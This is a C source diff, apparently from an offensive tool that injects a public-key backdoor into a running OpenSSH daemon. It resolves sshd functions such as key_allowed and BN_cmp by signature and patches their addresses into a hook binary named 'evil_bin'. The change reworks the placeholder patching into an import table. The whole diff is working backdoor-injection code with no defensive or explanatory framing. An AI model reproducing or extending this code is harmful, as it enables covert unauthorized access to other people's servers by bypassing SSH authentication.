@@ -19,23 +19,27 @@ extern int hook_pubkey_bin_len;
 
 void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	signature signatures[]={
-		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
-		{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
-		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 }, // wont work on OpenSSH 7.x
-		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 }, // wont work on OpenSSH 7.x
-		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 }, // wont work on OpenSSH 7.x
+		{ 0x1, "key_allowed", "trying public key file %s", 0 },
+		{ 0x2, "restore_uid", "restore_uid: %u/%u"       , 0 },
+		{ 0x3, "key_new"    , "key_new: RSA_new failed"  , 0 }, 
+		{ 0x4, "key_read"   , "key_read: type mismatch: ", 0 }, 
+		{ 0x5, "key_free"   , "key_free: "               , 0 }, 
 	};
 
 	u8 *evil_bin;
-	int i, j;
+	int i;
 	u32 callcache_total, num_key_allowed2_calls=0;
 	char line[255];
 	callcache_entry *callcache, *entry;
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
-	u64 diff=0, hole_addr=0;
+	u64 diff=0, hole_addr=0, *import_table;
 
 	evil_bin = malloc(hook_pubkey_bin_len);
+	import_table = (u64*)(evil_bin + 8);
+
 	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);
+
+	import_table[0] = ctx->config_addr;
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
 		if (ctx->uses_new_key_system == 0 || i < 2) {
@@ -115,19 +119,14 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 			signatures[i].name, signatures[i].addr - ctx->elf_base
 		);
 
-		for(j = 0; j < hook_pubkey_bin_len - 8; j++) {
-			u64 *vptr = (u64*)&evil_bin[j];
-			if (*vptr == signatures[i].placeholder) {
-				sprintf(
-					line+strlen(line), 
-					" .. [%lx] at offset %x in evil_bin!", 
-					signatures[i].placeholder, j
-				);
+		import_table[ signatures[i].import_id ] = signatures[i].addr;
 
-				*vptr = signatures[i].addr;
-				break;
-			}
-		}
+		sprintf(
+			line+strlen(line), 
+			" .. patched at offset 0x%lx in import table!", 
+			(signatures[i].import_id*8) & 0xffff
+		);
+
 		info(line);
 	}
 
@@ -137,8 +136,7 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	_peek(ctx->pid, ctx->elf_base + f_BN_cmp, &l_BN_cmp, 8);
 	info("BN_cmp@lib = 0x%lx", l_BN_cmp);
 
-	patch_placeholder(evil_bin, hook_pubkey_bin_len, 0xbadc0dedbeefbabe, l_BN_cmp);
-	patch_placeholder(evil_bin, hook_pubkey_bin_len, 0xc0debabe13371337, ctx->config_addr);
+	import_table[6] = l_BN_cmp;
 
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
